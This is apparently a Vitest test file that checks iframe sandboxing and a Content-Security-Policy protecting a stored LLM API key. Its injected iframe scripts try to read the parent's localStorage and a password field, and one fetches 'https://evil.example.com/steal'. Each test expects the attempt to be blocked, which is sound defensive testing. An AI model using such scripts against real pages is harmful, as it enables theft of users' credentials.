import { describe, it, expect, beforeAll } from 'vitest';
import { getDefaultLLMConfig } from '../services/llm/config';

describe('CSP and sandbox isolation', () => {
  beforeAll(() => {
    localStorage.setItem('codevinci-llm-enabled', 'true');
    localStorage.setItem('codevinci-llm-config', JSON.stringify({
      ...getDefaultLLMConfig(),
      apiKey: 'sk-test-key-in-storage',
    }));
  });

  it('sandboxed iframe (opaque origin) cannot access parent localStorage', async () => {
    const iframe = document.createElement('iframe');
    iframe.setAttribute('sandbox', 'allow-scripts');
    iframe.srcdoc = `
      <html><body>
      <script>
        try {
          parent.localStorage.getItem('codevinci-llm-config');
          parent.postMessage({ blocked: false, reason: 'accessed localStorage' }, '*');
        } catch (e) {
          parent.postMessage({ blocked: true, error: e.message }, '*');
        }
      </script>
      </body></html>
    `;
    document.body.appendChild(iframe);

    const result = await new Promise<any>((resolve) => {
      const handler = (event: MessageEvent) => {
        if (event.source === iframe.contentWindow) {
          window.removeEventListener('message', handler);
          iframe.remove();
          resolve(event.data);
        }
      };
      window.addEventListener('message', handler);
    });

    expect(result.blocked).toBe(true);
    expect(result.error).toMatch(/access|denied|security/i);
  });

  it('sandboxed iframe cannot access parent DOM', async () => {
    const input = document.createElement('input');
    input.type = 'password';
    input.value = 'sk-test-key-in-dom';
    input.id = 'llm-api-key';
    document.body.appendChild(input);

    const iframe = document.createElement('iframe');
    iframe.setAttribute('sandbox', 'allow-scripts');
    iframe.srcdoc = `
      <html><body>
      <script>
        try {
          const el = parent.document.getElementById('llm-api-key');
          parent.postMessage({ blocked: !el, value: el ? el.value : null }, '*');
        } catch (e) {
          parent.postMessage({ blocked: true, error: e.message }, '*');
        }
      </script>
      </body></html>
    `;
    document.body.appendChild(iframe);

    const result = await new Promise<any>((resolve) => {
      const handler = (event: MessageEvent) => {
        if (event.source === iframe.contentWindow) {
          window.removeEventListener('message', handler);
          iframe.remove();
          input.remove();
          resolve(event.data);
        }
      };
      window.addEventListener('message', handler);
    });

    expect(result.blocked).toBe(true);
  });

  it('CSP connect-src blocks arbitrary fetch from sandboxed iframe', async () => {
    document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').forEach(el => el.remove());
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = "default-src 'self'; connect-src 'self'; script-src 'self' 'unsafe-inline'";
    document.head.appendChild(meta);

    const iframe = document.createElement('iframe');
    iframe.setAttribute('sandbox', 'allow-scripts');
    iframe.srcdoc = `
      <html><body>
      <script>
        fetch('https://evil.example.com/steal')
          .then(() => parent.postMessage({ blocked: false, reason: 'fetch succeeded' }, '*'))
          .catch((e) => parent.postMessage({ blocked: true, error: e.message }, '*'));
      </script>
      </body></html>
    `;
    document.body.appendChild(iframe);

    const result = await new Promise<any>((resolve) => {
      const handler = (event: MessageEvent) => {
        if (event.source === iframe.contentWindow) {
          window.removeEventListener('message', handler);
          iframe.remove();
          resolve(event.data);
        }
      };
      window.addEventListener('message', handler);
    });

    expect(result.blocked).toBe(true);
  });
});
